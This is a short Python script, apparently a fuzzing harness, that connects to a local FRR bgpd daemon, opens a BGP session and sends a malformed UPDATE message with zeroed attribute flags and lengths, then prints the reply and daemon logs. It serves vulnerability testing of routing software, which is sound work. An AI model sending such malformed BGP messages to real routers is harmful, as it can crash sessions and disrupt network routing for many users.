import socket, struct, time, json
from models.bgpd.malformed_packets.dynamic_fuzz_runner_soft import build_bgp_open, build_bgp_keepalive, build_malformed_update, get_bgpd_logs
from models.bgpd.malformed_packets.attribute_model_extended import BGPPathAttr, parse_attributes

args = {
  "flags1": 0,
  "len1": 0,
  "flags4": 0,
  "type4": 7,
  "len4": 0
}

oracle_attrs = [
    BGPPathAttr(args.get('flags1',0)&0xFF, 1, args.get('len1',0)),
    BGPPathAttr(64, 2, 4),
    BGPPathAttr(64, 3, 4),
    BGPPathAttr(args.get('flags4',0)&0xFF, args.get('type4',0)&0xFF, args.get('len4',0))
]

s = socket.socket()
s.connect(("127.0.0.1", 1179))
s.sendall(build_bgp_open() + build_bgp_keepalive())
time.sleep(0.5)
update_bytes = build_malformed_update(oracle_attrs)
try:
    s.sendall(update_bytes)
    time.sleep(0.1)
except Exception as e:
    print(f"Error sending update: {e}")

s.setblocking(False)
try:
    print("Recv:", s.recv(4096))
except Exception:
    pass

s.close()
print("FRR Logs:")
print(get_bgpd_logs())
